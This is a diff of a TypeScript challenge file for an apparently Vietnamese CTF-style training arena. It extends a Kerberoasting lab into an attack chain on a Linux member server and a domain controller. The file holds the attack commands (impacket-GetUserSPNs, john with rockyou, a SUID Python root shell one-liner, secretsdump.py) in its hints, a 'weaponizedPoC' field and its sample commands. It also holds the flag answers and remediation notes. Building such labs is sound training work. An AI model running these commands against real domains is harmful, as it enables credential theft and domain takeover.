@@ -2,25 +2,57 @@ import type { ArenaChallenge } from '../../types';
 
 export const challengeKerberoasting: ArenaChallenge = {
   id: 'ad-kerb-01-kerberoasting',
-  title: 'Active Directory Kerberoasting & Offline Ticket Cracking',
+  title: 'Active Directory Kerberoasting to Linux Member SUID Root',
   category: 'active-directory',
   severity: 'high',
   cvssScore: 8.8,
-  bountyReward: 4000,
-  xpReward: 750,
+  bountyReward: 5800,
+  xpReward: 1150,
   estimatedMinutes: 25,
-  targetHost: '172.16.1.5',
+  targetHost: '172.16.1.10',
   targetPort: 88,
   tagline:
-    'Trích xuất Service Principal Name (SPN) TGS Ticket từ Active Directory và bẻ khóa offline.',
+    'Khai thác vé Kerberos TGS, SSH vào Linux Domain Member Server CORP-APP01, leo quyền qua SUID Python và pivot sang DC.',
   scenarioBriefing:
-    'Tài khoản dịch vụ SQL Service (svc_mssql) trong Domain corp.internal được đăng ký SPN và sử dụng mã hóa RC4-HMAC yếu kèm mật khẩu có độ phức tạp thấp. Bất kỳ Domain User hợp lệ nào cũng có thể yêu cầu vé Kerberos TGS và bẻ khóa mật khẩu offline để leo thang đặc quyền.',
+    'Domain corp.internal cấu hình tài khoản dịch vụ svc_mssql dùng mã hóa RC4 yếu. Kẻ tấn công trích xuất vé TGS bằng impacket-GetUserSPNs, crack hash mật khẩu offline, đăng nhập SSH vào máy chủ Linux Member Server (CORP-APP01: 172.16.1.10), leo quyền Root qua SUID Python3 và dump toàn bộ NTDS.dit của Domain Controller (172.16.1.5).',
   keyObjectives: [
-    'Chạy lệnh impacket-GetUserSPNs để truy vấn danh sách SPN accounts từ Domain Controller 172.16.1.5.',
-    'Yêu cầu TGS Ticket cho svc_mssql và xuất ra file hash krb5tgs.',
-    'Chạy công cụ bẻ khóa hashcat/john giả lập để giải mã mật khẩu và nộp Flag.',
+    'Giai đoạn 1 (Kerberoasting & Crack): Chạy impacket-GetUserSPNs trích xuất TGS ticket và dùng John the Ripper crack ra password của svc_mssql.',
+    'Giai đoạn 2 (Member Foothold & User Flag): Đăng nhập SSH vào Linux Member Server CORP-APP01, đọc User Flag tại /home/operator/user.txt.',
+    'Giai đoạn 3 (SUID PrivEsc to ROOT): Tìm SUID binary (/usr/bin/python3), khai thác GTFOBins spawn shell root (UID 0), đọc Root Flag tại /root/root.txt và chạy secretsdump.py pivot sang DC.',
   ],
-  expectedFlag: 'OS_0DAY{ad_kerberoast_svc_mssql_cracked_Summer2026!}',
+  userFlag: 'OS_0DAY{ad_kerberoast_svc_mssql_cracked_Summer2026!}',
+  rootFlag: 'OS_0DAY{ad_domain_privesc_suid_python_pwned}',
+  expectedFlag: 'OS_0DAY{ad_domain_privesc_suid_python_pwned}',
+  hints: [
+    {
+      level: 0,
+      name: 'SPN Ticket Extraction',
+      penaltyPercent: 0,
+      hintText:
+        'Chạy "impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request" để trích xuất hash.',
+    },
+    {
+      level: 1,
+      name: 'Offline Hash Cracking',
+      penaltyPercent: 10,
+      hintText:
+        'Dùng wordlist rockyou: "john --wordlist=/usr/share/wordlists/rockyou.txt /home/operator/ad-tools/hashes.kerb".',
+    },
+    {
+      level: 2,
+      name: 'SUID Binary Enumeration',
+      penaltyPercent: 20,
+      hintText:
+        'Trên máy chủ Linux Member Server, tìm binary SUID: "find / -perm -4000 2>/dev/null".',
+    },
+    {
+      level: 3,
+      name: 'SUID Python GTFOBins Execution',
+      penaltyPercent: 40,
+      hintText:
+        'Khai thác SUID Python3: python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\' để nâng quyền lên root.',
+    },
+  ],
   firstBloodHolder: {
     handle: '@ghost_zero',
     timeRecord: '08m 15s',
@@ -35,27 +67,30 @@ export const challengeKerberoasting: ArenaChallenge = {
     sampleCommands: [
       'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request',
       'john --wordlist=/usr/share/wordlists/rockyou.txt /home/operator/ad-tools/hashes.kerb',
+      'find / -perm -4000 2>/dev/null',
+      'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
+      'secretsdump.py',
     ],
     bannerText:
-      '[*] Active Directory Attack Station - Domain: corp.internal\n' +
-      '[*] Domain Controller: 172.16.1.5 (DC01.corp.internal)\n',
+      '[*] Active Directory Attack Suite - Domain: corp.internal\n' +
+      '[*] Domain Controller: 172.16.1.5 (CORP-DC01) | Member Server: 172.16.1.10 (CORP-APP01)\n',
   },
   writeup: {
-    title: 'Kerberoasting Attack Execution & Defense Hardening',
+    title: 'Active Directory Kerberoasting to Linux Member SUID Takeover',
     cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
     vulnerabilityOverview:
-      'Kerberoasting là kỹ thuật tấn công Active Directory nhắm vào các tài khoản người dùng có thuộc tính ServicePrincipalName (SPN). Vé TGS được mã hóa bằng mã băm NTLM của tài khoản dịch vụ, cho phép kẻ tấn công bẻ khóa offline không giới hạn số lần thử.',
+      'Tài khoản dịch vụ có SPN dùng mã hóa RC4 cho phép kẻ tấn công yêu cầu vé TGS và crack offline. Dùng tài khoản đăng nhập SSH vào máy chủ Linux Member Server CORP-APP01, khai thác SUID Python3 để leo lên Root và dump toàn bộ NTDS.dit của Domain.',
     rootCauseAnalysis:
-      'Theo thiết kế của giao thức Kerberos, KDC không kiểm tra xem client có quyền truy cập service hay không trước khi cấp vé TGS. Nếu tài khoản dịch vụ dùng mật khẩu yếu hoặc mã hóa RC4 cũ, hash có thể bị crack trong vài giây.',
+      '1. SPN svc_mssql dùng mật khẩu yếu (Summer2026!).\n2. Binary /usr/bin/python3 trên máy chủ Linux Member Server bị gán cờ SUID 04755.',
     exploitChainWalkthrough: [
-      'Bước 1: Xác thực vào Domain với quyền user thông thường.',
-      'Bước 2: Gửi yêu cầu TGS-REQ tới KDC cho SPN MSSQLSvc/db01.corp.internal.',
-      'Bước 3: Lưu vé TGS trả về định dạng $krb5tgs$23$*.',
-      'Bước 4: Sử dụng Hashcat (Mode 13100) để bẻ khóa mật khẩu.',
+      'Bước 1: Trích xuất vé TGS bằng impacket-GetUserSPNs và crack hash lấy mật khẩu Summer2026!.',
+      'Bước 2: Đăng nhập SSH vào CORP-APP01 và đọc User Flag tại /home/operator/user.txt.',
+      'Bước 3: Chạy find / -perm -4000 phát hiện SUID Python, nâng quyền lên root lấy Root Flag tại /root/root.txt.',
+      'Bước 4: Chạy secretsdump.py trích xuất NTLM hash của Domain Administrator.',
     ],
     weaponizedPoC:
-      'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request -outputfile hashes.kerb\nhashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt',
+      'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request\njohn --wordlist=rockyou.txt hashes.kerb\npython3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
     remediationSnippet:
-      '// 1. Chuyển sang sử dụng Group Managed Service Accounts (gMSA) tự đổi mật khẩu 128-bit:\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.internal\n// 2. Vô hiệu hóa mã hóa RC4 trên toàn bộ Domain Kerberos policies.',
+      '// 1. Chuyển sang Group Managed Service Accounts (gMSA).\n// 2. Gỡ bỏ quyền SUID trên python3:\nchmod 0755 /usr/bin/python3',
   },
 };
